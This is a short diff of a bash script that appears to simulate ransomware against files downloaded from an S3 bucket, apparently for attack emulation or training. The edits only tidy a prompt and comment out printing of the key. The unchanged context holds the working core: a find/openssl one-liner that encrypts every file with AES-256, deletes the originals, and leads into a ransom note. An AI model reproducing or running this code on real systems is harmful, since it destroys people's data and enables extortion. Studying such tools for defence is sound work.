@@ -20,7 +20,7 @@ mkdir -p ../OriginalData
 cp -r . ../OriginalData/
 
 ## Encrypt files downloaded from S3 bucket
-printf "\n[!] Type encryption key for locking the files:"
+printf "\n[!] Type encryption key for locking the files:\n"
 ENC_KEY=
 while IFS= read -r -s -n1 char; do
   if [[ $char == $'\0' ]]; then
@@ -29,8 +29,12 @@ while IFS= read -r -s -n1 char; do
   ENC_KEY=$ENC_KEY$char
   echo -n "*"
 done
+
+## Print encryption key to screen
+# printf "$ENC_KEY"
+
+## Encrypt files locally using openSSL
 printf "\n[+] Encrypting downloaded files...\n"
-printf "$ENC_KEY"
 find ./* -type f -exec openssl enc -aes-256-cbc -pbkdf2 -salt -in {} -out {}.encrypted -k $ENC_KEY \;  -exec rm {} \;
 
 ## Create ranson note text file
